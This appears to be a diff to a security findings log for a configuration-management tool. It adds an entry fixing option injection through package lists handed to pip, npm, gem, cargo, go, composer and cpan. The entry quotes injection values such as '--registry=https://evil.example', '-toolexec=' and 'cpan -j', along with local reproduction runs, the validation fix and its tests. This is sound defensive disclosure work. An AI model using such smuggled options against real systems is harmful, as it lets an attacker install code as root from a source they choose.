@@ -30207,7 +30207,7 @@ what the account has since put at it: `config:
 /home/deploy/.ssh/authorized_keys`, the default file spelled out, went by
 path through the same link the default path refuses. Fixed by deciding on
 where the path lands rather than on whether `config` was given; see
-5.568.
+5.569.
 ### 5.350 git.latest's `user` was never read, so every checkout was root's
 
 Issue 321 finding M-24. `git.latest` declared `user` ("Run git as this
@@ -37059,8 +37059,30 @@ A worker the stop cut short still does not release its event (`reactorWorker.run
 **Broken on purpose.** With the wait removed from `Run` the test fails as above. With the wait kept, `reactorWorker.run` releasing its event regardless of the context, and the `ctx.Done` branch of `Run` waiting for the workers before its final commit (the obvious way to write this, and wrong), it fails on the offset: `"00000001:381", want "00000001:0"`. Restored, it passes, and the `Reactor|Reaction|Reacted|Debounc|EventReturn|Serve` tests of `internal/hub` pass under `-race`.
 
 **Not verified.** The `serve` half has no test that holds one of its loops across a stop: it is checked by building, by the `cmd/halite-hub` tests that start a real `serve` and stop it with SIGINT (which still stop), and by reading. Neither the two-second "waiting" log nor a second signal ending the wait was run. A shutdown now takes as long as the slowest reaction in flight, which is `reactor_timeout` (60 seconds by default) only where the runner honours its context; one that does not is ended by the second signal, or by the service manager's stop timeout, where it has one. Still not waited for: the relay's goroutines (`startRelay`), and a debounce timer that fires after the stop, which can emit `halite/reactor/loop` or `halite/reactor/overflow` onto the bus from `enqueue` with no worker left to run it. None of it was run on FreeBSD or under a service manager; `make check` was not run.
+### 5.568 A language package manager's name could be its option, run as root
 
-### 5.568 A `config` path in the account's home still followed the account's link
+Issue 321, the close-out review of 2026-11-03, item A7 (`internal/builtin/lang.go`, `lang_more.go`, `lang_build.go`, `lang_states.go`). The language half of 5.307, whose "Not verified" said `pip`, `npm` and `gem` "were not looked at".
+
+**The defect.** 5.307 put `pkgValidateName` in front of every OS package manager and none of the language ones. Each of `pip`, `npm`, `gem`, `cargo`, `go`, `composer` and `cpan` appends a caller's list to its argv as it stands, so an item beginning with `-` reaches the tool as an option. `npm.installed` with `pkgs: ["--registry=https://evil.example", left-pad]` installs `left-pad` from that registry, as root, chosen by whoever can write the list (pillar, an included SLS, the API). The others have the same door: `pip`'s `--index-url=`, `gem`'s `--source=`, `cargo`'s `--index=` and `--git=`, `go install -toolexec=` (a program run for every compile), `cpan -j` (a Perl file loaded as cpan's configuration), `composer`'s `--working-dir=`. `gem.install`'s and `cargo.install`'s `version` is an argv element of its own after `--version`, and `go.env`'s `name` is the one argument after `go env`, where `-w` writes.
+
+**Shown.** On 2026-11-04, on macOS 26.7.2 (arm64), unprivileged, `halite-node call --local` built from 5c44bed3 and from this change, each payload pointing at 127.0.0.1:9, where nothing listens, with scratch `GEM_HOME`, `CARGO_HOME`, a scratch venv as `bin_env` and a scratch `dir` for npm:
+- npm 11.20.0, `npm.install` and a `state.apply` of an `npm.installed` state with `--registry=http://127.0.0.1:9` in `pkgs`: on 5c44bed3 both ran `npm install --registry=http://127.0.0.1:9 left-pad` and failed `ECONNREFUSED`.
+- pip 26.2.2 (Python 3.15, in a venv), `pip.install` with `--index-url=http://127.0.0.1:9/simple`: on 5c44bed3 pip retried against `127.0.0.1:9` (`Connection refused`).
+- gem 4.0.23, `gem.install` with `--clear-sources` and `--source=http://127.0.0.1:9`: on 5c44bed3 gem asked `http://127.0.0.1:9/specs.4.8.gz`.
+- cargo 1.72.0-nightly, `cargo.install` with `--index=sparse+http://127.0.0.1:9/`: on 5c44bed3 cargo printed ``Updating `sparse+http://127.0.0.1:9/` index``.
+- cpan (Homebrew perl), `cpan.install` with `-j/nonexistent/halite-a7.pm`: on 5c44bed3 cpan answered `cpan config file [/nonexistent/halite-a7.pm] for -j does not exist!`.
+- go 1.27.3, `go.install` with `-toolexec=/usr/bin/false` and `.`: go took the flag (it did not say "flag provided but not defined") and then failed on the install location, so the toolexec program was never reached. That shows the parse, not the execution.
+
+On this change every one of these, the state included, is refused with `pkgValidateName`'s message and runs nothing. composer is not installed on that machine and was not run.
+
+**The change.** `langNames(args, key)` reads the list through `pkgValidateNames`, and is the only way the language functions read one: `pip.install`/`uninstall`, `npm.install`/`uninstall`, `gem.install`/`uninstall`, `cargo.install`/`uninstall`, `go.install`, `composer.require`, `cpan.install`. `gem.install`'s and `cargo.install`'s `version` go through `pkgValidateVersion`, and `go.env`'s `name` through `pkgValidateName`. The six states (`pip`, `npm`, `gem` × `installed`, `removed`) check each spec in `langPresent` and `langAbsent` before the installed list is read, so a refused state asks the tool nothing. A state checks the raw spec, not the name `parseSpec` splits from it, because that is what reaches argv, and because npm's `@scope/pkg` splits on its own leading `@` into an empty name.
+
+The rule is 5.307's, not one per ecosystem, for the reason `pkgValidateName` gives. Every legitimate shape begins with something else; `TestLangLegitimateNamesReachTheArgv` holds `requests[socks]>=2.31`, `@types/node@20.1.0`, `golang.org/x/tools/cmd/stringer@latest`, `monolog/monolog:^3.0` and `JSON::PP` reaching argv unchanged.
+
+**Tests.** `TestLangRefusesOptionInjection` calls every one of those functions with a payload, in a dry run and a real one, through a recording runner, and requires a refusal and no command at all. On 5c44bed3 it failed 48 times (24 calls, each in both modes). `TestLangEveryNameTakingFunctionIsCovered` holds the list to the registry: a function of those seven modules taking `name`, `pkgs`, `gems`, `crates` or `modules` must be in it. Broken on purpose, one at a time: `langNames` not validating fails the eleven execution functions; `langValidateSpecs` returning nil fails the six states; the two `version` checks and `go.env`'s check removed fail those three cases; `cpan.install` dropped from the list fails the coverage test.
+
+**Not verified.** Nothing ran as root, on FreeBSD or on Linux. composer was not run at all. go's `-toolexec` was shown to parse, not to run. The explicit options that take a URL on purpose (`pip.install`'s `index_url`, `npm`'s `registry`) are unchanged: they are the tree asking for an index, not a name being read as one. `maven.run`'s `goals` reach `mvn` as they stand and were not changed: a goal list is a build invocation that a tree may legitimately fill with options. The value `parseSpec` makes of a scoped npm name (an empty name, so a state cannot compare it with the installed list) is pinned by `TestParseSpec` and was not changed. The evidence levels of these modules are unchanged: the runs above show what each tool reads, not that an install through halite works.
+### 5.569 A `config` path in the account's home still followed the account's link
 
 Issue 321 close-out item A10, found by reading `sshAccountFileFor` after
 the M-30 fix (5.349). That fix read and wrote a named account's ssh file
@@ -37139,12 +37161,6 @@ links to follow, not this one. A relative `config` is resolved against
 the node's working directory, as it was; how Salt resolves one was not
 checked here. A home that is itself a link, or writable by others, is
 trusted, as 5.349 says.
-
-
-
-
-
-
 
 
 
